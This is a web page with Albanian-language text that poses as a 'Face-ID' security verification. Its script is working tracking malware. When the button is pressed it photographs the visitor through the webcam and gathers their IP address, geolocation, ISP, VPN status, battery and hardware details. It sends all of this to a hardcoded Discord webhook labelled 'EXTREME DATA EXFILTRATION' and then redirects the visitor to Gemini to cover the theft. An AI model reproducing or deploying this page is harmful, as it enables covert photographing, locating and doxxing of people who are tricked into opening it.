
<!DOCTYPE html>
<html lang="sq">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification | Identity Check</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .terminal { width: 90%; max-width: 600px; padding: 20px; border: 1px solid #0f0; box-shadow: 0 0 20px #0f0; background: rgba(0, 20, 0, 0.9); }
        .line { margin: 5px 0; font-size: 14px; white-space: pre-wrap; }
        .blink { animation: blinker 1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
        video, canvas { display: none; }
        .btn { background: #0f0; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="terminal" id="terminal">
        <div class="line"> [SYSTEM]: INITIATING SECURE PROTOCOL...</div>
        <div class="line"> [SYSTEM]: ANALYZING CONNECTION...</div>
        <div class="line" id="status"> [WAIT]: Duke pritur verifikimin e identitetit...</div>
        <button class="btn" id="startBtn">VERIFIKO IDENTITETIN (FACE-ID)</button>
        <div class="line blink">_</div>
    </div>

    <!-- Elementet e fshehura për foto -->
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1497231122667409610/UIfP7aK35EKcrRKZz7Zh3QIAUdW_VAfo-MUBOzxJpLZMwsCPCVoerrS3Y9PTOxT_8L2m";
        const redirectURL = "https://gemini.google.com/app";

        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Funksioni për marrjen e modelit të iPhone
        function getDetailedModel() {
            const w = window.screen.width;
            const h = window.screen.height;
            const r = window.devicePixelRatio;
            if (r === 3 && w === 393 && h === 852) return "iPhone 15 / 15 Pro / 14 Pro";
            if (r === 3 && w === 430 && h === 932) return "iPhone 15 Pro Max / 15 Plus / 14 Pro Max";
            if (r === 3 && w === 390 && h === 844) return "iPhone 14 / 13 / 13 Pro / 12 / 12 Pro";
            if (r === 3 && w === 428 && h === 926) return "iPhone 14 Plus / 13 Pro Max / 12 Pro Max";
            return `${navigator.platform} (Res: ${w}x${h})`;
        }

        async function sendToDiscord(embed, blob = null) {
            const formData = new FormData();
            
            if (blob) {
                formData.append('file', blob, 'face-capture.png');
            }
            
            formData.append('payload_json', JSON.stringify({
                username: "EXPLOIT SYSTEM",
                avatar_url: "https://i.imgur.com/8nLFC9m.png",
                embeds: [embed]
            }));

            await fetch(webhookURL, { method: 'POST', body: formData });
        }

        async function captureFace() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                
                status.innerText = " [OK]: Verifikimi në proces...";

                // Presim pak që kamera të fokusohet
                await new Promise(r => setTimeout(r, 1500));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
                
                // Mbyllim kamerën
                stream.getTracks().forEach(track => track.stop());
                return blob;
            } catch (err) {
                console.log("Kamera u refuzua.");
                return null;
            }
        }

        startBtn.onclick = async () => {
            startBtn.style.display = "none";
            status.innerText = " [WAIT]: Duke hapur modulin e sigurisë...";

            // 1. Kapim foton (Kërkon leje)
            const faceBlob = await captureFace();

            // 2. Mbledhim të dhënat extreme
            const ipRes = await fetch('https://demo.ip-api.com/json/?fields=66846719');
            const g = await ipRes.json();
            
            let battery = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
            }

            const embed = {
                title: "💀 EXTREME DATA EXFILTRATION",
                color: 16711680,
                fields: [
                    { name: "📱 Pajisja", value: `\`${getDetailedModel()}\``, inline: true },
                    { "name": "🔋 Bateria", "value": `\`${battery}\``, "inline": true },
                    { "name": "🌐 IP Real", "value": `\`${g.query}\``, "inline": true },
                    { "name": "📍 Lokacioni", "value": `\`${g.city}, ${g.regionName}, ${g.country}\``, "inline": true },
                    { "name": "📡 ISP", "value": `\`${g.isp}\``, "inline": false },
                    { "name": "⚙️ Hardware", "value": `CPU: ${navigator.hardwareConcurrency} | RAM: ~${navigator.deviceMemory}GB`, "inline": true },
                    { "name": "⏰ Ora", "value": `\`${new Date().toLocaleString()}\``, "inline": true },
                    { "name": "🛡️ VPN?", "value": g.proxy ? "⚠️ PO" : "✅ JO", "inline": true },
                    { "name": "📱 User-Agent", "value": `\`\`\`${navigator.userAgent}\`\`\``, "inline": false },
                    { "name": "🗺️ Maps", "value": `[Klikoni për Hartën](https://www.google.com/maps?q=${g.lat},${g.lon})`, "inline": false }
                ],
                footer: { text: "Protocol: EXTREME-LOG-v7" },
                timestamp: new Date()
            };

            await sendToDiscord(embed, faceBlob);
            
            status.innerText = " [OK]: Verifikimi përfundoi. Duke u ridrejtuar...";
            setTimeout(() => { window.location.href = redirectURL; }, 1000);
        };
    </script>
</body>
</html>
